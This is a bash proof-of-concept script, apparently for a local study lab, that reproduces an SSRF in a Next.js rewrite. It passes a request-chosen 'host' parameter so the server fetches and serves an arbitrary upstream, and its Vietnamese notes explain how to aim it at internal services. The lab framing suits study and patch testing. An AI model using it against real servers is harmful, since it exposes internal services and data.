#!/usr/bin/env bash
# LAB ONLY - CVE-2026-64645 (SSRF via rewrites with request-controlled hostname).
#
# Study build only. next.config.mjs maps:
#   /supplier-assets/:path*?host=<host>  ->  https://<host>/:path*
# The Next.js server performs the upstream request and serves the response from
# its own origin. Use only in an isolated local lab.
set -u
FE="${FE_BASE_URL:-http://127.0.0.1:3000}"
TARGET="${1:-www.iana.org}"

echo "== Không có ?host= (không khớp rewrite) =="
curl -s -o /dev/null -w "GET /supplier-assets/robots.txt -> HTTP %{http_code}\n" "$FE/supplier-assets/robots.txt"

echo
echo "== Có ?host=$TARGET (server fetch host do request chọn) =="
curl -s -D /tmp/lab64645.headers -o /tmp/lab64645.body \
  -w "GET /supplier-assets/robots.txt?host=$TARGET -> HTTP %{http_code}, %{size_download} bytes, type=%{content_type}\n" \
  "$FE/supplier-assets/robots.txt?host=$TARGET"
echo "--- 300 ký tự đầu response ---"
head -c 300 /tmp/lab64645.body; echo

echo
echo "Ghi chú: rewrite dùng scheme https cố định, nên không đọc được service http nội bộ"
echo "trừ khi service đó có TLS. Muốn chứng minh đọc dữ liệu nội bộ, dựng một HTTPS server"
echo "local rồi trỏ host=127.0.0.1:<port>."
